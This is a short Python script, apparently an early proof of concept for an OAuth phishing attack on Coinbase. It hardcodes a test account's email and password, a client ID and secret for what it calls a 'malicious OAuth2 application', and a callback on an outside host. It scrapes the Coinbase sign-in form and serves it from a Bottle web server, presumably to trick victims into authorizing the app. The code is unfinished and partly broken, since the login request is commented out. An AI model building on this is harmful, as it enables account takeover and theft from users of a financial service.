#!/usr/bin/python
import requests
from BeautifulSoup import BeautifulSoup
from bottle import Bottle, run, template

# Dummy user to retreive the OAuth form
EMAIL = 'donncha.c.arroll@gmail.com'
PASSWORD = 'coinbase test'

# Credentials for malicious OAuth2 application
CLIENT_ID = '83004d2b1d6af3dbf4bd87bc8512786e4f0f5df0c6b8608247d376110433585c'
CLIENT_SECRET = '3cf47d2462478b162219718afb37cf7b38ae0404b04a2d17b3d20c22b27fb906'
CALLBACK_URL = 'http://tor.totalimpact.ie:8443'


def retrieveOAuthForm(email, password):
  client = requests.session()
  client.headers.setdefault('User-Agent', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:20.0) Gecko/20100101 Firefox/20.0')
  
  # Get login page and scrape CSRF token's etc.
  r = client.get('https://coinbase.com/signin')
  login_page = BeautifulSoup(r.text)
  for i in login_page.findAll("input"):
    login_data = { i['name'] : i.get('values', '') }
  
  login_data['email'] = email
  login_data['password'] = password
  
  print login_data
  
  #print r.text
  
  #login_data = {'email': email, 'password': password, 'stay_signed_in': 1}
  #r = client.post(URL, data=login_data, headers={"Referer": 'https://coinbase.com/signin'})
  #print r
  #print r.text

  
# Setup Bottle Webserver
app = Bottle()
@app.route('/')
def landingPage():
    return retrieveOAuthForm(EMAIL, PASSWORD)

run(app, host='0.0.0.0', port=8443)
